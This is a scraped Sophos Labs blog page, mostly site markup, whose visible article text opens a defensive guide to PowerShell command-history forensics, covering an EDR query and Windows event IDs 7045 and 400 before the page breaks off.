<link rel="stylesheet" href="https://community.sophos.com/cfs-filesystemfile/__key/uifiles/h-00000000c5a78d6b-3fc3f82483d14ec485ef92e206116d49-b-d464a5a0b4b946b7b085e3eade1355a0-0-header-1128-637384878543600000-https-communitysophoscom-443/style.less?_=637412228028398858"  />
<link rel="stylesheet" href="/utility/scripted-file.ashx?_cf=style.vm&_fid=1128&_wid=header-1128&_ct=header&_cp=&_ctt=a3b17ab0af5f11dda3501fcf55d89593&_ctc=d464a5a0b4b946b7b085e3eade1355a0&_ctn=3fc3f82483d14ec485ef92e206116d49&_cc=0&_ipd=10&_pcurl=~%2Fsophos-labs%2Fb%2Fblog%2Fposts%2Fpowershell-command-history-forensics"  />
<link rel="stylesheet" href="https://community.sophos.com/cfs-filesystemfile/__key/uifiles/h-00000000c5a78d6b-3fc3f82483d14ec485ef92e206116d49-b-d464a5a0b4b946b7b085e3eade1355a0-0-header-1129-637471984893130000-https-communitysophoscom-443/style.less?_=637471992864907429"  />
<link rel="stylesheet" href="https://community.sophos.com/cfs-filesystemfile/__key/uifiles/h-00000000c5a78d6b-3fc3f82483d14ec485ef92e206116d49-b-d464a5a0b4b946b7b085e3eade1355a0-0-ppost0-3074-637521515178200000-https-communitysophoscom-443/style.less?_=637521536799185029"  />
<link rel="stylesheet" href="https://community.sophos.com/cfs-filesystemfile/__key/uifiles/h-00000000c5a78d6b-3fc3f82483d14ec485ef92e206116d49-b-d464a5a0b4b946b7b085e3eade1355a0-0-ppost0-3075-637521515178200000-https-communitysophoscom-443/style.less?_=637521536798794373"  />
<link rel="stylesheet" href="https://community.sophos.com/cfs-filesystemfile/__key/uifiles/h-00000000c5a78d6b-3fc3f82483d14ec485ef92e206116d49-b-d464a5a0b4b946b7b085e3eade1355a0-0-ppost0-3078-637521515178200000-https-communitysophoscom-443/style.less?_=637521536802163519"  />
<link rel="stylesheet" href="https://community.sophos.com/cfs-filesystemfile/__key/uifiles/h-00000000c5a78d6b-3fc3f82483d14ec485ef92e206116d49-b-d464a5a0b4b946b7b085e3eade1355a0-0-ppost0-3081-637521515178200000-https-communitysophoscom-443/style.less?_=637521536807759289"  />
<link rel="stylesheet" href="https://community.sophos.com/cfs-filesystemfile/__key/uifiles/h-00000000c5a78d6b-3fc3f82483d14ec485ef92e206116d49-b-d464a5a0b4b946b7b085e3eade1355a0-0-footer-1507-637384878543600000-https-communitysophoscom-443/style.less?_=637412228041621492"  />
<link rel="stylesheet" href="https://community.sophos.com/cfs-filesystemfile/__key/uifiles/h-00000000c5a78d6b-3fc3f82483d14ec485ef92e206116d49-b-d464a5a0b4b946b7b085e3eade1355a0-0-footer-1402-637384878543600000-https-communitysophoscom-443/style.less?_=637412228042021850"  /><link rel="pingback" href="https://community.sophos.com/sophos-labs/b/blog/pingback" /><link rel="alternate" type="application/rss+xml" title="Blog (RSS 2.0)" href="https://community.sophos.com/sophos-labs/b/blog/rss"  /><link rel="alternate" type="application/atom+xml" title="Blog  (Atom 1.0)" href="https://community.sophos.com/sophos-labs/b/blog/atom"  /><link rel="alternate" type="application/rss+xml" title="Blog - All Comments (RSS 2.0)" href="https://community.sophos.com/sophos-labs/b/blog/rsscomments"  /><link rel="alternate" type="application/rss+xml" title="Blog - Comments for this post (RSS 2.0)" href="https://community.sophos.com/sophos-labs/b/blog/rsscomments?WeblogPostID=707"  /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://community.sophos.com/sophos-labs/b/blog/rsd" /><link rel="wlwmanifest" type="application/wlwmanifest+xml" title="WLWManifest" href="https://community.sophos.com/sophos-labs/b/blog/wlwmanifest" /><title>

</title></head><body spellcheck="true"><form name="ctl04" method="post" action="./powershell-command-history-forensics" id="ctl04">
<div>
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="ZZevGkkyO17JfHxwIXykMbrDXGMZP7XtnUZgK8y+AvaYB/2e7CzoGUgRLyDPrXOq+tmY5A==" />
</div>


<script src="/WebResource.axd?d=3KNc1qD2td3njStYBL12vEv3TPILn6xwHoiERXVBIPqOvqYk_-S7ydeyNSe7doU1BsW23Gryi1lwMkZ17GngFpiDlpC0rTCGI2CVpGT0GBt0P5VXK3FQflDLEDBjafE_vfXa9ROgEMeQMwMZosCZHi68I781&amp;t=636585609760000000" type="text/javascript"></script>
<script src="/WebResource.axd?d=XZtWz8xG5Xixtjrd1JSvSQTPDR6RMhAyxCAiXKCEvMmzKQOjN7Hk8H-kfH748V8NButvoXuRUq-oblyq8Qb-N-KnEz8p1Dld-IUg4AU6dc6nNtjx1SwZRlgdpqzqD-S2o5IjepkvFc7zhfcvilnxPGCV6c-H89ky6pG3yfipgACQLLF90&amp;t=636585609760000000" type="text/javascript"></script>
<div>

	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="C21772F6" />
</div>


<div class="single-column header-fragments evolution-reflow-container" data-related="_h_page" id="_h_singlecolumn" style = "display:none"></div><div class="header-fragments evolution-reflow-container" data-related="_h_singlecolumn" id="_h_page"  data-reflow-width="670"><div class="layout">
<div class="layout-header"></div>
<div class="layout-content header-top-content" id="_h_layout"><div class="layout-region header" id="_h_header">
<div class="layout-region-inner header"><div class="content-fragment site-banner no-wrapper responsive-1 	all
" id="header-1665" data-reflow="_h_header,_h_singlecolumn,1,0,0">
<div class="content-fragment-content">







	
				
		
					
			
		
		
		
					


	
<style>
.header-fragments .layout .header-top-content .layout-region.header {
	background-color: #005BB5;
}

.banner.site fieldset ul.field-list li.field-item .field-item-input input {
	background-color: #FFFFFF;
}


.header-fragments .header-top-content .layout-region.header .banner.site .navigation-list ul a,
.header-fragments .header-top-content .layout-region.header .banner.site .navigation-list ul a.active,
.header-fragments .header-top-content .layout-region.header .banner.site fieldset ul li .field-item-input input,
.header-fragments .header-top-content .layout-region.header .banner.site fieldset ul li .field-item-input input.active,
.header-fragments .header-top-content .layout-region.header .banner.site fieldset ul.field-list li.field-item .field-item-input:after,
.header-fragments .header-top-content .layout-region.header .banner.site fieldset ul.field-list li.field-item .field-item-input input.active,
.header-fragments .header-top-content .layout-region.header .content-fragment.navigation-custom .navigation-list[data-direction='horizontal'] a {
	color: #FFFFFF;
}
.header-fragments .header-top-content .layout-region.header .banner.site fieldset ul.field-list li.field-item .field-item-input input::placeholder {
	color: #FFFFFF;
}
.header-fragments .header-top-content .layout-region.header .banner.site fieldset ul.field-list li.field-item .field-item-input input:-ms-input-placeholder {
	color: #FFFFFF;
}
.header-fragments .header-top-content .layout-region.header .banner.site fieldset ul.field-list li.field-item .field-item-input input::-ms-input-placeholder {
	color: #FFFFFF;
}

.header-fragments:hover .header-top-content .layout-region.header .banner.site .navigation-list ul a,
.header-fragments:hover .header-top-content .layout-region.header .banner.site .navigation-list ul a.active,
.header-fragments .header-top-content .layout-region.header .banner.site .navigation-list ul a.active,
.header-fragments:hover .header-top-content .layout-region.header .banner.site fieldset ul li .field-item-input input,
.header-fragments:hover .header-top-content .layout-region.header .banner.site fieldset ul li .field-item-input input.active,
.header-fragments:hover .header-top-content .layout-region.header .banner.site fieldset ul.field-list li.field-item .field-item-input:after,
.header-fragments:hover .header-top-content .layout-region.header .banner.site fieldset ul.field-list li.field-item .field-item-input input.active,
.header-fragments .header-top-content .layout-region.header .content-fragment.navigation-custom .navigation-list[data-direction='horizontal'] a.subnav-open,
.header-fragments .header-top-content .layout-region.header .content-fragment.navigation-custom .navigation-list[data-direction='horizontal'] a.links-expanded,
.header-fragments:hover .header-top-content .layout-region.header .content-fragment.navigation-custom .navigation-list[data-direction='horizontal'] a {
	color: #FFFFFF;
}
.header-fragments:hover .header-top-content .layout-region.header .banner.site fieldset ul.field-list li.field-item .field-item-input input::placeholder {
	color: #FFFFFF;
}
.header-fragments:hover .header-top-content .layout-region.header .banner.site fieldset ul.field-list li.field-item .field-item-input input:-ms-input-placeholder {
	color: #FFFFFF;
}
.header-fragments:hover .header-top-content .layout-region.header .banner.site fieldset ul.field-list li.field-item .field-item-input input::-ms-input-placeholder {
	color: #FFFFFF;
}
.header-fragments .header-top-content .layout-region.header .content-fragment.navigation-custom .navigation-list[data-direction='horizontal'] a.selected:after {
	background-color: #FFFFFF;
}




.single-column .banner.site {
	background-color: #005BB5;
}
.single-column .banner.site > .navigation-list.handheld ul a,
.single-column .banner.site .container.handheld .user-links ul a {
	color: #FFFFFF;
}
.single-column .banner.site > .navigation-list.handheld ul a.active,
.single-column .banner.site .container.handheld .user-links ul a.active {
	color: #FFFFFF;
}
</style>

<div class="banner site  all   with-site-navigation " id="header-1665_banner">
		
        		<div class="avatar">
																		<a href="https://community.sophos.com/" title="Home"  class="ui-tip" >
					<img src="https://community.sophos.com/cfs-filesystemfile/__key/communityserver-components-imagefileviewer/widgetcontainerfiles-3fc3f82483d14ec485ef92e206116d49-s-AAAAAAAAAAAAAAAAAAAAAA-header-header-c8ENZAqqeE2sTV5uCdYhhQ-logo/sophos_2D00_community_2D00_logo.png_2D00_250x88.png_2D00_250x88.png?_=637532462997003012" border="0px" alt="Sophos Community" style="max-width:125px;max-height:44px;" />
				</a>
					</div>

					<div class="name hidden">Sophos Community</div>
		    								<div class="navigation-list site-links" id="header-1665_bannerSiteLinks">
				<ul>
					<li class="navigation-list-item">
						<a href="#"
																						class="site-navigation group ui-tip"
													id="header-1665_site">Site</a>
					</li>
				</ul>
			</div>
				            		
		<fieldset class="search" id="header-1665_searchFields">
        <div id="searchbox" data-pipeline="Support" data-tab="Support">
          <div class="coveo-search-section">
            <div
              class="CoveoSearchbox"
              data-enable-omnibox="true"
              data-enable-query-suggest-addon="true"
            ></div>
          </div>
        </div>
    </fieldset>
								<div class="navigation-list user-links" id="header-1665_bannerLinks">
					<ul>
																																																																				<li class="navigation-list-item">
								<a href="/login?ReturnUrl=%2Fsophos-labs%2Fb%2Fblog%2Fposts%2Fpowershell-command-history-forensics" class="internal-link user with-icon ui-tip" title="Join or sign in">User</a>
							</li>
																																																												</ul>
				</div>
						<div class="navigation-list handheld">
			<ul>
				<li class="navigation-list-item">
					<a href="#" class="site" id="header-1665_handheldSiteLinksLink" >Site</a>
				</li>
				<li class="navigation-list-item">
					<a href="#" class="search" id="header-1665_handheldSearchFieldsLink">Search</a>
				</li>
				<li class="navigation-list-item">
																		<a href="/login?ReturnUrl=%2Fsophos-labs%2Fb%2Fblog%2Fposts%2Fpowershell-command-history-forensics" class="user">User</a>
															</li>
			</ul>
		</div>
		<div class="container handheld">
			<fieldset class="search" style="display:none" id="header-1665_handheldSearchFields"></fieldset>
			<div class="user-links" style="display:none" id="header-1665_handheldBannerLinks"></div>
		</div>
	</div>

</div>
<div class="content-fragment-footer"></div>
</div>
</div>
</div>
<div class="layout-region content" id="_h_content">
<div class="layout-region-inner content"><div class="content-fragment navigation-custom no-wrapper responsive-1" id="header-1128" data-reflow="_h_content,_h_singlecolumn,1,1,1">
<div class="content-fragment-content">




	


			<div class="ui-links navigation-list links"
			id="header-1128_container"
			data-minlinks="0"
			data-direction="horizontal"
			data-maxlinks="8">
			<ul class="navigation-list">
						<li class="navigation-list-item">
					<a href="/p/all-groups" >Sophos Community</a>
																		<ul class="children" style="display:none">
																			<li>
								<a href="/intercept-x-endpoint/" >Intercept X Endpoint</a>
							</li>
																			<li>
								<a href="/sophos-xg-firewall/" >Sophos (XG) Firewall</a>
							</li>
																			<li>
								<a href="/zero-trust-network-access/" >Zero Trust Network Access (EAP)</a>
							</li>
																			<li>
								<a href="/utm-firewall/" >UTM Firewall</a>
							</li>
																			<li>
								<a href="/sophos-partners/" >Sophos Partners</a>
							</li>
																			<li>
								<a href="/product-documentation/" >Product Documentation</a>
							</li>
																			<li>
								<a href="/community-chat/" >Community Chat</a>
							</li>
													</ul>
											
				</li>
						<li class="navigation-list-item">
					<a href="/b" >Community Blogs & Events</a>
																		<ul class="children" style="display:none">
																			<li>
								<a href="/c/13" >Community Calendar</a>
							</li>
																			<li>
								<a href="/b/community-blog" >Sophos Community Blog</a>
							</li>
																			<li>
								<a href="/b/security-blog" >Community Security Blog</a>
							</li>
													</ul>
											
				</li>
						<li class="navigation-list-item">
					<a href="/w/getting-started" >Getting Started</a>
																
				</li>
						<li class="navigation-list-item">
					<a href="https://community.sophos.com/w/member-recognition/48/sophos-partners" >Sophos Partners</a>
																
				</li>
						<li class="navigation-list-item">
					<a href="/w/member-recognition" >Member Recognition</a>
																		<ul class="children" style="display:none">
																			<li>
								<a href="/leaders" >Community Leaderboards</a>
							</li>
													</ul>
											
				</li>
						<li class="navigation-list-item">
					<a href="https://techvids.sophos.com/" >Support Videos</a>
																
				</li>
						<li class="navigation-list-item">
					<a href="https://docs.sophos.com/" >Product Documentation</a>
																		<ul class="children" style="display:none">
																			<li>
								<a href="/product-documentation/" >Feedback on Product Documentation</a>
							</li>
													</ul>
											
				</li>
						<li class="navigation-list-item">
					<a href="http://support.sophos.com" >Support Portal</a>
																		<ul class="children" style="display:none">
																			<li>
								<a href="https://sophos.com" >Sophos.com</a>
							</li>
													</ul>
											
				</li>
					<li class="navigation-list-item">
					<a href="#" class="prepend-icon down-open-mini" data-more>More</a>
				</li>
				<li class="navigation-list-item">
					<a href="#" data-cancel>Cancel</a>
				</li>
			</ul>
		</div>
		</div>
<div class="content-fragment-footer"></div>
</div>
<div id="header-1129"></div>
<div class="content-fragment group-banner no-wrapper responsive-1" id="header-1485" data-reflow="_h_content,_h_singlecolumn,1,1,3">
<div class="content-fragment-content">









		
	
			
			
		
<style>
		
	
	
		.single-column.header-fragments,
		.header-fragments .layout .header-top-content .layout-region.content,
		.header-fragments .layout .header-top-content.with-adaptable-elements .layout-region.content {
			background: #FFFFFF;
		}

	
				.single-column.header-fragments {}

		.header-fragments .layout .header-top-content:not(.scrolled) .layout-region.content,
		.header-fragments .layout .header-top-content.with-adaptable-elements:not(.scrolled) .layout-region.content {
			 border-bottom: 1px solid #CFD8DC;
		}

		.header-fragments .layout .header-top-content:not(scrolled) {
			box-shadow: none;
		}
		.header-fragments .layout .header-top-content.scrolled {
			box-shadow: 0 2px 5px rgba(0, 0, 0, 0.15);
		}
		
		.banner.context.slim .hierarchy > .parent-navigation a.more:before,
	.banner.context > .hierarchy > .parent-navigation ul li a,
	.banner.context > .hierarchy > .parent-navigation ul li a:hover,
	.banner.context > .hierarchy > .parent-navigation ul li a:before,
	.scrolled .banner.context > .hierarchy > .parent-navigation a.more:before,
	.scrolled .banner.context > .hierarchy > .parent-navigation ul li a:before,
	.banner.context > .hierarchy > .parent-navigation ul li a.more.links-expanded,
	.banner.context > .hierarchy > .parent-navigation ul li a.more.links-expanded:before,
	.banner.context > .hierarchy > .parent-navigation ul li a.more:before {
		color: #263238;
	}

		.banner.context > .hierarchy > .current-hierarchy > .hierarchy-component,
	.banner.context > .hierarchy > .current-hierarchy > .hierarchy-component a,
	.banner.context > .hierarchy > .current-hierarchy > .hierarchy-component:before,
	.banner.context > .hierarchy > .current-hierarchy > .hierarchy-component a:hover {
		color: #263238;
	}

		.banner.context > .hierarchy > .current-hierarchy > .applications ul a,
	.banner.context > .hierarchy > .current-hierarchy > .applications ul a:hover,
	.banner.context > .hierarchy > .current-hierarchy > .applications ul a.more,
	.banner.context:not(.home) > .hierarchy > .current-hierarchy > .applications ul a.more,
	.banner.context:not(.home) > .hierarchy > .current-hierarchy > .applications ul a.more:before,
	.banner.context.home > .hierarchy > .current-hierarchy > .applications ul a.more:before,
	.scrolled .banner.context .hierarchy .current-hierarchy > .applications ul a.more,
	.scrolled .banner.context .hierarchy .current-hierarchy > .applications ul a.more:before,
	.banner.context.slim:not(.home) > .hierarchy > .current-hierarchy > .applications ul a.more,
	.banner.context.slim:not(.home) > .hierarchy > .current-hierarchy > .applications ul a.more:before,
	.scrolled .banner.context:not(.home) > .hierarchy > .current-hierarchy > .applications ul a.more,
	.scrolled .banner.context:not(.home) > .hierarchy > .current-hierarchy > .applications ul a.more:before {
		border-color: #263238;
		color: #263238;
	}
	.banner.context.home > .hierarchy > .current-hierarchy > .applications ul a.links-expanded,
	.banner.context.home > .hierarchy > .current-hierarchy > .applications ul a.links-expanded:before,
	.banner.context.home > .hierarchy > .current-hierarchy > .applications ul a.more.links-expanded:before,
	.scrolled .banner.context .hierarchy .current-hierarchy > .applications ul a.more.links-expanded,
	.scrolled .banner.context .hierarchy .current-hierarchy > .applications ul a.more.links-expanded:before,
	.banner.context:not(.home) > .hierarchy > .current-hierarchy > .applications ul a.more.links-expanded,
	.banner.context:not(.home) > .hierarchy > .current-hierarchy > .applications ul a.more.links-expanded:before,
	.banner.context.slim:not(.home) > .hierarchy > .current-hierarchy > .applications ul a.more.links-expanded,
	.banner.context.slim:not(.home) > .hierarchy > .current-hierarchy > .applications ul a.more.links-expanded:before,
	.scrolled .banner.context:not(.home) > .hierarchy > .current-hierarchy > .applications ul a.more.links-expanded,
	.scrolled .banner.context:not(.home) > .hierarchy > .current-hierarchy > .applications ul a.more.links-expanded:before {
		background-color: #263238;
		color: #FFFFFF;
		border-color: #263238;
	}

		.banner.context > .new ul a,
	.banner.context .navigation-list.new ul a.links-expanded,
	.banner.context .navigation-list.new ul a.links-expanded:hover,
	.banner.context .navigation-list.new ul a.links-expanded:active,
	.banner.context .navigation-list.new ul a:hover {
		background-color: #263238;
		color: #FFFFFF;
	}
	.single-column .banner.context > .new a,
	.single-column .banner.context:not(.home) > .new a,
	.single-column .banner.context.home > .new a {
		color: #263238;
		border-color: #263238;
	}

		.banner.application,
	.banner.application .navigation-list a,
	.banner.application .name .title a {
		color: #263238;
	}
	.banner.application::after {
		background-color: #263238;
	}


		.header-fragments .content-fragment.navigation-custom .navigation-list[data-direction='horizontal'] a,
	.header-fragments .content-fragment.navigation-custom .navigation-list[data-direction='horizontal'] a:hover {
		color: #263238;
	}
	.header-fragments .content-fragment.navigation-custom:after,
	.header-fragments .content-fragment.navigation-custom .navigation-list[data-direction='horizontal'] a.selected:after {
		background-color: #263238;
	}
	.header-fragments:hover .header-top-content .layout-region.content .content-fragment.navigation-custom .navigation-list[data-direction='horizontal'] a {
		color: #263238;
	}
	.header-fragments .header-top-content .layout-region.content .content-fragment.navigation-custom .navigation-list[data-direction='horizontal'] a.links-expanded,
	.header-fragments .header-top-content .layout-region.content .content-fragment.navigation-custom .navigation-list[data-direction='horizontal'] a.subnav-open,
	.header-fragments:hover .header-top-content .layout-region.content .content-fragment.navigation-custom .navigation-list[data-direction='horizontal'] a.links-expanded,
	.header-fragments:hover .header-top-content .layout-region.content .content-fragment.navigation-custom .navigation-list[data-direction='horizontal'] a.subnav-open {
		background-color: #263238;
		color: #FFFFFF;
	}

</style>


	<script>
	(function(j){
		j('body').addClass('no-cover');
	})(jQuery);
	</script>



<div class="banner context  slim inherited   with-application    ">
	<div class="avatar">
		<a href="https://community.sophos.com/sophos-labs/"  >
			<img src="https://community.sophos.com/cfs-filesystemfile/__key/communityserver-components-imagefileviewer/communityserver-components-groupavatars-00-00-00-00-48/malware_2D00_136x136.png.png_2D00_68x68x2.png?_=636109420846002725" alt="Sophos Labs" />
		</a>
	</div>

	<div class="hierarchy">

					
		
		<div class="current-hierarchy">

							<div class="container hierarchy-component">
					<a href="https://community.sophos.com/sophos-labs/"><span  >Sophos Labs</span></a>
				</div>
			
												<span class="application hierarchy-component">
						<a href="https://community.sophos.com/sophos-labs/b/blog"><span >Blog</span></a>
					</span>
													<span class="content hierarchy-component">
						<a href="https://community.sophos.com/sophos-labs/b/blog/posts/powershell-command-history-forensics"><span >PowerShell Command History Forensics</span></a>
					</span>
							            				<div  class="navigation-list applications"  >
					<div class="ui-links" data-minlinks="0"  data-maxlinks="0" data-direction="vertical"  id="header-1485_applicationNavigation">
						<ul>
																												<li class="navigation-list-application  selected">
									<a href="/sophos-labs/b/blog" class="internal-link view-application weblog single  selected">Blog</a>
								</li>
																																			<li class="navigation-list-application ">
									<a href="/sophos-labs/b/application-control" class="internal-link view-application weblog single ">Application Control</a>
								</li>
																																			<li class="navigation-list-application ">
									<a href="/sophos-labs/f/recommended-reads" class="internal-link view-application forum single ">Recommended Reads</a>
								</li>
																																			<li class="navigation-list-application ">
									<a href="/sophos-labs/f/discussions" class="internal-link view-application forum single ">Discussions</a>
								</li>
																	<li class="navigation-list-item">
								<a href="#" class="more" data-more>More</a>
							</li>
							<li class="navigation-list-item">
								<a href="#" data-cancel>Cancel</a>
							</li>
						</ul>
					</div>
				</div>
			
		</div>

	</div>

	
	
			<div class="navigation-list new">
			<div class="ui-links" data-direction="vertical">
				<ul class="navigation-list">
					<li class="navigation-list-item">
						<a href="/login?ReturnUrl=%2Fsophos-labs%2Fb%2Fblog%2Fposts%2Fpowershell-command-history-forensics">New</a>
					</li>
				</ul>
			</div>
		</div>
		</div>

</div>
<div class="content-fragment-footer"></div>
</div>
<div class="content-fragment blog-banner no-wrapper responsive-1" id="header-1486" data-reflow="_h_content,_h_singlecolumn,1,1,4">
<div class="content-fragment-content">




			<style>
		.banner.application {
			min-height: 60px;
		}
		</style>
		<script>
		(function(j){
			j(function(){
				j(window).trigger('dynamic-cover-loaded');
			});
		})(jQuery);
		</script>
	

<div class="banner application">
	<div class="name">
					<h1 class="title">
				<a href="https://community.sophos.com/sophos-labs/b/blog/posts/powershell-command-history-forensics">PowerShell Command History Forensics</a>
			</h1>
			</div>

		</div></div>
<div class="content-fragment-footer"></div>
</div>
<div id="header-1130"></div>
</div>
</div>
</div>
<div class="layout-footer"></div>
</div></div>
<div class="single-column content-fragment-page post evolution-reflow-container" data-related="_p_page" id="_p_singlecolumn" style = "display:none"></div><div class="content-fragment-page post evolution-reflow-container" data-related="_p_singlecolumn" id="_p_page"  data-reflow-width="670"><div class="layout">
<div class="layout-header"></div>
<div class="layout-content content-left-sidebar-right" id="_p_layout"><div class="layout-region right-sidebar" id="_p_right-sidebar">
<div class="layout-region-inner right-sidebar"><div class="content-fragment blog-details no-wrapper responsive-1" id="fragment-3071" data-reflow="_p_right-sidebar,_p_singlecolumn,1,5,0">
<div class="content-fragment-content">




<div class="content-details">

						<div class="content-tags">
				<ul class="tag-list">
											<li class="tag-item">
					<a href="/tags/clear_2D00_history" rel="tag">clear-history</a>
				</li>
														<li class="tag-item">
					<a href="/tags/ConsoleHost_5F00_history-txt" rel="tag">ConsoleHost_history.txt</a>
				</li>
														<li class="tag-item">
					<a href="/tags/psreadline" rel="tag">psreadline</a>
				</li>
														<li class="tag-item">
					<a href="/tags/get_2D00_history" rel="tag">get-history</a>
				</li>
														<li class="tag-item">
					<a href="/tags/console" rel="tag">console</a>
				</li>
														<li class="tag-item">
					<a href="/tags/History" rel="tag">History</a>
				</li>
														<li class="tag-item">
					<a href="/tags/command" rel="tag">command</a>
				</li>
														<li class="tag-item">
					<a href="/tags/PowerShell" rel="tag">PowerShell</a>
				</li>
									</ul>
			</div>
			
	<ul class="attribute-list">

				
		
					<li class="attribute-item like ">
				<span class="attribute-name"></span>
				<span class="attribute-value">
															<span  class="ui-presentcontent ui-like ui-tip" data-presentcontents="c7d1bb2e7a5c48e699db6d6d55e160fe|f7d226abd59f475c9d224a79e3f0ec07|"  data-tipcontent="initialmessage" data-contentid="c7d1bb2e-7a5c-48e6-99db-6d6d55e160fe" data-contenttypeid="f7d226ab-d59f-475c-9d22-4a79e3f0ec07" data-initialcount="6" data-initialstate="false" data-readonly="true" data-initialmessage="&lt;a href=&quot;/members/yashraj&quot; class=&quot;internal-link view-user-profile&quot;>Yashraj&lt;/a> and &lt;span class=&quot;who-likes&quot;>5 others&lt;/span> like this" data-format="{count}" data-configuration="Format=%7Bcount%7D&amp;IncludeLike=true&amp;IncludeTip=true" ></span>
				</span>
			</li>
		
			</ul>
</div>

	</div>
<div class="content-fragment-footer"></div>
</div>
<div id="fragment-3072"></div>
<div class="content-fragment blog-links no-wrapper responsive-1" id="fragment-3073" data-reflow="_p_right-sidebar,_p_singlecolumn,1,5,2">
<div class="content-fragment-content">



	<div class="ui-links navigation-list links" data-minlinks="2" data-direction="vertical" data-minlinks="0" data-maxlinks="0">
		<ul class="navigation-list">
																		<li class="navigation-list-item"><a href="mailto:?subject=PowerShell Command History Forensics&body=https://community.sophos.com/sophos-labs/b/blog/posts/powershell-command-history-forensics" class="internal-link email-post"><span></span>Share</a></li>
																																																																<li class="navigation-list-item">
							<a href="#" onclick="jQuery.glowModal('/utility/scripted-file.ashx?_cf=subscribebyemail.vm\u0026_fid=3073\u0026_wid=fragment-3073\u0026_ct=page\u0026_cp=post\u0026_ctt=a3b17ab0af5f11dda3501fcf55d89593\u0026_ctc=d464a5a0b4b946b7b085e3eade1355a0\u0026_ctn=3fc3f82483d14ec485ef92e206116d49\u0026_cc=0\u0026_ipd=0\u0026_pcurl=~%2Fsophos-labs%2Fb%2Fblog%2Fposts%2Fpowershell-command-history-forensics\u0026BlogId=28', { width: 400, height: 200 }); return false;">Subscribe by email</a>
						</li>
																											  																																								                    			    				  	        <li class="navigation-list-item">
	            <a href="#" data-more>More</a>
	        </li>
	        <li class="navigation-list-item">
	            <a href="#" data-cancel>Cancel</a>
	        </li>
		</ul>
	</div>

			</div>
<div class="content-fragment-footer"></div>
</div>
<div class="content-fragment more-content no-wrapper with-header with-spacing responsive-3 
			as-slider
		" id="fragment-3074" data-reflow="_p_right-sidebar,_p_singlecolumn,3,5,3">
<div class="content-fragment-header">
Related
			</div>
<div class="content-fragment-content">

<div id="fragment-3074_delayedPagedContentWrapper"></div>
			</div>
<div class="content-fragment-footer"></div>
</div>
<div class="content-fragment more-content no-wrapper with-header with-spacing responsive-3 
			as-slider
		" id="fragment-3075" data-reflow="_p_right-sidebar,_p_singlecolumn,3,5,4">
<div class="content-fragment-header">
Recommended
			</div>
<div class="content-fragment-content">

<div id="fragment-3075_delayedPagedContentWrapper"></div>
			</div>
<div class="content-fragment-footer"></div>
</div>
</div>
</div>
<div class="layout-region content" id="_p_content">
<div class="layout-region-inner content"><div id="fragment-3076"></div>
<div id="fragment-3077"></div>
<div class="content-fragment blog-post-byline no-wrapper with-spacing responsive-2" id="fragment-3078" data-reflow="_p_content,_p_singlecolumn,2,1,7">
<div class="content-fragment-content">




<div class="content-details">
	<div class="content-author">
		<div class="avatar">
							<a href="/members/vikas">
					<img src="https://community.sophos.com/cfs-filesystemfile/__key/communityserver-components-imagefileviewer/communityserver-components-avatars-00-00-01-03-13/4U2VSFHQS2F5.png_2D00_80x80x2.png?_=636464647707692323" border="0px" alt="Vikas" />
				</a>
					</div>
		<span class="user-name">
							<a href="/members/vikas" class="internal-link view-user-profile">
					Vikas
				</a>
					</span>
	</div>
	<div class="content-date">
		26 Aug 2020
	</div>
</div>

		</div>
<div class="content-fragment-footer"></div>
</div>
<div id="fragment-3079"></div>
<div class="content-fragment blog-post no-wrapper with-spacing responsive-2" id="fragment-3080" data-reflow="_p_content,_p_singlecolumn,2,1,9">
<div class="content-fragment-content">





<div class="content full text">
			<div class="content"><div class="page" title="Page 2">
<div class="layoutArea">
<div class="column">
<h1>Contents:</h1>
<p><strong>- <a href="#Overview">Overview</a></strong></p>
<ul>
<li><a href="#PowerShell%20and%20Windows%20Events"><strong>Powershell and Windows Events</strong></a></li>
<li><a href="#Get-History"><strong>Get-History</strong></a></li>
<li><a href="#Console%20History%20File"><strong>Console History File</strong></a></li>
</ul>
<p><strong>- <a href="#Adversarial%20Tactics">Adversarial&nbsp;Tactics</a></strong></p>
<ul>
<li><a href="#Clear-History"><strong>Clear-History</strong></a></li>
<li><a href="#Backup/Restore%20History"><strong>Backup/Restore Histroy</strong></a></li>
<li><a href="#Delete%20History%20File"><strong>Delete File History</strong></a></li>
<li><a href="#Change%20PSReadline%20Configuration"><strong>Change PSReadline Configuration</strong></a></li>
</ul>
<p><strong>- <a href="#Investigation%20Tips">Investigation Tips</a></strong></p>
<h1><a id="Overview"></a>Overview</h1>
<p style="font-weight:400;">PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code.</p>
<p style="font-weight:400;">PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.</p>
<p style="font-weight:400;">We have a separate blog which touches certain aspects of a malicious PowerShell script here -&nbsp;<a href="/products/malware/b/blog/posts/decoding-malicious-powershell">Decoding Malicious PowerShell Activity - A Case Study - Blog - Malware Questions - Sophos Community</a></p>
<p style="font-weight:400;">A number of PowerShell-based offensive testing tools are available, including Empire,&nbsp;PowerSploit, PoshC2, and&nbsp;PSAttack.</p>
<h2><a id="PowerShell and Windows Events"></a>PowerShell and Windows Events</h2>
<p style="font-weight:400;">With Sophos EDR, you can use &ldquo;PowerShell events suspected of using encoded or encrypted data&rdquo; Live Discover Query. It outputs a list PowerShell processes and script block events that are suspected of using encoded or encrypted data.</p>
<p style="font-weight:400;"><a href="/cfs-file/__key/communityserver-blogs-components-weblogfiles/00-00-00-00-28/1.png"><img src="/resized-image/__size/1280x960/__key/communityserver-blogs-components-weblogfiles/00-00-00-00-28/1.png" alt=" " /></a>On the host side of forensics, there are 3 places where we look for signs of suspicious PowerShell script or command execution whether it&rsquo;s local or remote:</p>
<ol>
<li style="font-weight:400;">Application Event Logs</li>
</ol>
<ul>
<li style="font-weight:400;">Event ID 7045: Adversaries often attempt to register backdoors as Windows Services as a persistence mechanism i.e. survive reboots.</li>
</ul>
<p><a href="/cfs-file/__key/communityserver-blogs-components-weblogfiles/00-00-00-00-28/2.png"><img src="/resized-image/__size/640x480/__key/communityserver-blogs-components-weblogfiles/00-00-00-00-28/2.png" alt=" " /></a></p>
<ol start="2">
<li style="font-weight:400;">Windows PowerShell.evtx</li>
</ol>
<ul>
<li style="font-weight:400;">Event ID 400: The engine status is changed from None to Available. This event indicates the start of a PowerShell activity, whether local or remote.</li>
</ul>
